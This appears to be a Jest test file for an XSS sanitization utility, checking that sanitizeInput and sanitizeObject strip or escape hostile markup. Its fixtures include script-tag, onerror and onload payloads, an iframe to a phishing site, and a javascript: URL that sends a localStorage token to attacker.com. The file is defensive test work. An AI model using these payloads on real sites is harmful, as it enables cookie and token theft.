import { sanitizeInput, sanitizeObject } from '../utils/sanitizer';

describe('Security: XSS Sanitization Engine', () => {
  describe('sanitizeInput', () => {
    it('strips <script> tags and active payloads', () => {
      const malicious = "<script>alert('XSS-Attack')</script>John Doe";
      const cleaned = sanitizeInput(malicious);
      expect(cleaned).not.toContain('<script>');
      expect(cleaned).not.toContain('alert');
      expect(cleaned).toBe('John Doe');
    });

    it('strips malicious <img src=x onerror=...> event handlers', () => {
      const malicious = '<img src="invalid.jpg" onerror="alert(document.cookie)">';
      const cleaned = sanitizeInput(malicious);
      expect(cleaned).not.toContain('onerror');
      expect(cleaned).not.toContain('alert');
    });

    it('strips javascript: pseudo-protocols', () => {
      const malicious = 'javascript:fetch("https://attacker.com?steal="+localStorage.getItem("token"))';
      const cleaned = sanitizeInput(malicious);
      expect(cleaned.toLowerCase()).not.toContain('javascript:');
    });

    it('strips iframe, embed, object and style injections', () => {
      const iframePayload = '<iframe src="http://phishing.site"></iframe>Legitimate User';
      expect(sanitizeInput(iframePayload)).toBe('Legitimate User');

      const stylePayload = '<style>body { display: none; }</style>Content';
      expect(sanitizeInput(stylePayload)).toBe('Content');
    });

    it('escapes leftover dangerous HTML entities', () => {
      const input = '<div class="banner">VIP Flyer & "Frequent Guest"</div>';
      const cleaned = sanitizeInput(input);
      expect(cleaned).toContain('&amp;');
      expect(cleaned).toContain('&quot;');
    });

    it('preserves clean text, numbers, and legitimate punctuation', () => {
      const normalName = 'Mary-Jane O’Connor';
      expect(sanitizeInput(normalName)).toContain('Mary-Jane');

      const normalEmail = 'user.name+flight@domain.aero';
      expect(sanitizeInput(normalEmail)).toBe('user.name+flight@domain.aero');
    });

    it('handles non-string types safely (null, undefined, numbers)', () => {
      expect(sanitizeInput(null)).toBe('');
      expect(sanitizeInput(undefined)).toBe('');
      expect(sanitizeInput(45000)).toBe('45000');
    });
  });

  describe('sanitizeObject', () => {
    it('recursively sanitizes nested objects and arrays', () => {
      const input = {
        firstName: '<script>evil()</script>Alice',
        lastName: 'Smith',
        metadata: {
          notes: '<img src=x onerror=alert(1)>Special assistance required',
          tags: ['<svg onload=alert(2)>', 'VIP'],
        },
      };

      const sanitized = sanitizeObject(input);
      expect(sanitized.firstName).toBe('Alice');
      expect(sanitized.metadata.notes).not.toContain('onerror');
      expect(sanitized.metadata.tags[0]).not.toContain('onload');
      expect(sanitized.metadata.tags[1]).toBe('VIP');
    });
  });
});
